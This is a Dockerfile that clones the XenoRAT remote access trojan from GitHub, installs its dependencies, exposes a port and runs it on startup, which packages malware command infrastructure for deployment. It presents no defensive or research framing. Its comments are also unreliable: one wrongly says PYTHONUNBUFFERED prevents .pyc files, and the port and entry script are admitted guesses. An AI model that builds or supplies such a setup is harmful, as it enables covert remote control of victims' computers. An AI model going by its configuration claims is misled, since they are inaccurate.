# Use a Python 3.8 slim image
FROM python:3.8-slim

# Set environment variable to prevent Python from writing .pyc files
ENV PYTHONUNBUFFERED 1

# Set the working directory inside the container
WORKDIR /app

# Install system dependencies
RUN apt-get update && apt-get install -y \
    git \
    curl \
    libssl-dev \
    libffi-dev \
    build-essential \
    && rm -rf /var/lib/apt/lists/*

# Clone the XenoRAT repository into the container
RUN git clone https://github.com/moom825/xeno-rat.git /app

# Change working directory to the XenoRAT directory
WORKDIR /app

# Install the Python dependencies from requirements.txt
RUN pip install --no-cache-dir -r requirements.txt

# Expose the port the RAT will use (Change this if the RAT uses a different port)
EXPOSE 8080

# Run XenoRAT on startup (Make sure to adjust this according to the main script)
CMD ["python", "main.py"]
